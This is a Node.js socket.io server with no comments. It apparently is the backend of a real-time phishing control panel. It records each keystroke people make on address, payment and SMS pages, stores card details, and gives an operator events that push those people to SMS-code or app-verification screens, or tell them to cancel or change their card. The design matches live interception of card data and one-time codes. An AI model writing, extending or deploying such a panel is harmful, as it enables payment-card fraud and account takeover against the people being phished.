const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const io = require("socket.io")(server, {
  cors: { origin: "*" },
});

let connectedClients = [];

io.on("connection", (socket) => {
  socket.on("disconnect", () => {
    const updatedClients = connectedClients.map((client) => {
      if (client.socketId === socket.id) {
        return {
          ...client,
          status: false,
        };
      } else return client;
    });
    connectedClients = updatedClients;
    io.emit("refreshClients", { clients: connectedClients });
  });

  socket.on("cancelCard", () => {
    io.emit("cancelCardAlert");
  });

  socket.on("cardRelease", () => {
    io.emit("smsRedirect");
  });

  socket.on("appVerification", () => {
    io.emit("verificationRedirect");
  });

  socket.on("smsPass", () => {
    io.emit("smsPassRedirect");
  });

  socket.on("smsReject", () => {
    io.emit("smsReject");
  });

  socket.on("changeCard", () => {
    io.emit("changeCard");
  });

  socket.on("clientEvent", (data) => {
    const info = JSON.parse(data);
    const {
      id,
      page,
      field,
      value,
      is_typing,
      userId,
      card_detail,
      submitted,
      verified,
    } = info;
    const foundIndex = connectedClients.findIndex((client) => client.id === id);
    let address = null;
    let payment = null;
    let sms = null;
    if (foundIndex === -1) {
      connectedClients.push({
        id: id,
        status: true,
        active: true,
        socketId: socket.id,
        page: page,
        address: address,
        payment: payment,
        sms: sms,
        submitted: submitted,
        verified: verified,
        is_typing: is_typing,
      });
    } else {
      address = connectedClients[foundIndex].address;
      payment = connectedClients[foundIndex].payment;
      if (page === "address" && field) {
        address = {
          ...connectedClients[foundIndex].address,
          [field]: value,
        };
      }
      if (page === "payment" && field) {
        payment = {
          ...connectedClients[foundIndex].payment,
          [field]: value,
        };
      }
      if (page === "sms" && field) {
        sms = {
          ...connectedClients[foundIndex].sms,
          [field]: value,
        };
      }
      connectedClients[foundIndex] = {
        ...connectedClients[foundIndex],
        status: true,
        active: true,
        socketId: socket.id,
        page: page,
        address: address,
        payment: payment,
        sms: sms,
        is_typing: is_typing,
        submitted: submitted,
        verified: verified,
        userId: userId,
        card_detail: card_detail
          ? card_detail
          : connectedClients[foundIndex].card_detail,
      };
    }
    io.emit("refreshClients", { clients: connectedClients });
  });

  socket.on("refresh", () => {
    const filters = connectedClients.filter(
      (client) => client.status === true || client.payment
    );
    connectedClients = filters;
    io.emit("refreshClients", { clients: connectedClients });
  });

  socket.on("onlineClients", () => {
    const clients = connectedClients.map((client) => {
      if (client.status === false) {
        return {
          ...client,
          active: false,
        };
      } else return client;
    });
    connectedClients = clients;
    io.emit("refreshClients", { clients: connectedClients });
  });

  socket.on("addressData", (data) => {
    const info = JSON.parse(data);
    const { id } = info;
    const filters = connectedClients.filter((client) => client.id === id);
    if (filters.length) {
      io.emit("fetchAddressData", {
        address: filters[0].address ? filters[0].address : null,
      });
    }
  });
});

server.listen(3000, () => {
  console.log("Server is running");
});
